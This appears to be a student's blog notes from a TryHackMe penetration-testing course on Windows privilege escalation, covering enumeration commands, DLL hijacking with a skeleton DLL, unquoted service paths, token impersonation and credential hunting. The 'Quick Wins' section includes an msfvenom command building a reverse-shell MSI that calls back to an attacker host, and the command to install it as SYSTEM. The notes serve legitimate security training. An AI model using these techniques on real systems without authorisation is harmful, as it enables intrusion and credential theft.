---
title: 'TryHackMe: Jr. Penetration Tester'
date: 2022-04-21 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-04-21-tryhackme-jr-penetration-tester.html
author: 100007
---

# Windows PrivEsc

## Introduction

Common Windows user levels:

- Local Admin
- Local User
- Guest User
- Domain User
- Domain Admin

Note that non-admin domain users may still be local admins.

Note that most Windows antivirus products will not allow enumeration scripts to be run.

Here’s a useful checklist:

- [Windows - Privilege Escalation (PayloadsAllTheThings)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## Information Gathering

- `whoami /priv` - current user + privileges
- `net user` - list all (local) users
- `net user $USERNAME` - get details for user `$USERNAME`
- `net localgroup` - list all (local) groups
- `net localgroup $GROUP` – list user in group `$GROUP`
- `query session` - list other users who are currently logged in
- `systeminfo` - return system info
- `hostname` - return system hostname
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` - list installed updates (only Windows 10 21H1 and older)
- `schtasks` - list scheduled tasks
- `driverquery` - list installed drivers
- `sc` - query (and manipulate) services (does not work in PowerShell!)

Note that the `findstr` command is the Windows equivalent of `grep` (and sometimes also `find`). Also remember that you can use pipe in Windows!

Note that Windows provides the `netstat` command, and it recognizes all of the switches we’d hope it does. Note, however, that `-o` displays the PID of the process using the connection on Windows.

Microsoft Defender uses the service name `windefend`.

- [Using “netstat”](https://cardboard-iguana.com/notes/netstat.html)

## Tools of the Trade

- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [Metasploit](https://cardboard-iguana.com/notes/metasploit.html)

Notes:

- WinPEAS is detected and quarantined by Microsoft Defender by default.
- PowerUp may require an unrestricted PowerShell session (`powershell -nop -exec bypass`), which can raise alerts.
- Windows Exploit Suggester analyzes the output of `systeminfo`, and can be run on the attacker’s machine.
- The `multi/recon/local_exploit_suggester` module works through Meterpreter to analyze a Windows system for potential vulnerabilities.

## Vulnerable Software

- `wmic product` - list all installed software (but misses 32-bit applications installed on a 64-bit OS)
- `wimc service list brief` - another way of listing services

## DLL Hijacking

Basically, this is the Windows equivalent of exploiting `LD_PRELOAD` or `LD_LIBRARY_PATH`.

Windows DLL search order if `SafeDllSearchMode` is enabled:

- The application directory
- The system directory (as returned by `GetSystemDirectory()`)
- The 16-bit (!) system directory
- The Windows directory (as returned by `GetWindowsDirectory()`)
- The current directory (!)
- The system `PATH` (!)

Windows DLL search order if `SafeDllSearchMode` is disabled:

- The application directory
- The current directory (!)
- The system directory (as returned by `GetSystemDirectory()`)
- The 16-bit (!) system directory
- The Windows directory (as returned by `GetWindowsDirectory()`)
- The system `PATH` (!)

It seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run). So, local testing!

A skeleton DLL:

```
#include <windows.h>

BOOL WINAPI DllMain
(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /C whoami > C:\Temp\dll.txt");
		ExitProcess(0);
	}
	return TRUE;
}
```

Compile with mingw (this _can_ be done on Linux!):

```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

Note that Windows _also_ comes with `wget`!

```
# Change user foo's password to "bar" (requires admin/SYSTEM
# authority):
#
net user foo bar
#
# Note that this does *NOT* bypass any password complexity
# requirements!
```

- [Exploiting LD\_PRELOAD](https://cardboard-iguana.com/notes/exploiting-ld-preload.html)
- [Exploiting LD\_LIBRARY\_PATH](https://cardboard-iguana.com/notes/exploiting-ld-library-path.html)

## Unquoted Service Path

Formally, when Windows encounters an unquoted service path it tries _all_ possible paths, from shortest to longest. Thus `C:\Program Files\service path\service.exe` will cause Windows to look for the following executables, in order:

- `C:\Program.exe`
- `C:\Program Files\service.exe`
- `C:\Program Files\service path\service.exe`

If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.

Print out all services:

```
wmic service get name,displayname,pathname,startmode
```

You can inspect the service paths in this output to see if any have spaces _and_ are unquoted.

When checking the permissions of a folder, note that the Windows File Explorer isn’t good about displaying permissions for users who have _multiple_ applied ACLs. Use `icacls` or `Get-Acl $PATH | Format-List`, and be sure to keep your eyes peeled for duplicate user entries (_all_ of which will be applied!).

Find a file in Windows:

```
dir $FILE_NAME /S
```

- [How to find a file or folder in MS-DOS or Windows command line](https://www.computerhope.com/issues/ch000309.htm)

## Token Impersonation

Prior to Windows 10 1809 / Server 2019, services could be forced to authenticate to a local port controlled by a low-privilege attacker, which would then allow the attacker to proxy and capture the NTLM handshake and thus (typically) a SYSTEM token. (This vulnerability _technically_ still exists, its just that unprivileged accounts can no longer use this token; check to see if the output of `whoami /priv` contains the `SeImpersonatePrivilege` privilege to see if you’ve gotten lucky.)

Exploits in this family are typically named “X Potato” after the first exploit, “Hot Potato”.

## Quick Wins

(1) Look for defunct (but still running) scheduled tasks with running as a more highly privileged account that point to a path you can control.

(2) If `AlwaysInstallElevated` is set to 1 under both of the following keys, then MSI installers will run as SYSTEM.

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Generate a malicious MSI file with msfvenom:

```
msfvenom -p windows/x64/shell_reverse_tcp \
	LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT \
		-f msi -o $INSTALLER.msi
```

Then install on the target to gain SYSTEM:

```
msiexec /quiet /qn /i $INSTALLER.msi
```

(3) Check for saved passwords of othe users with `cmdkey /list`. If any exist, then they can be used in `runas` with the `/savecred` flag.

(4) Sometimes registry keys contain passwords! Apparently, you can query/search across registry keys using `reg query ...`.

(5) Windows uses a file called `unattend.xml` to store setup auto-configuration information. Check if these have been left lying around.

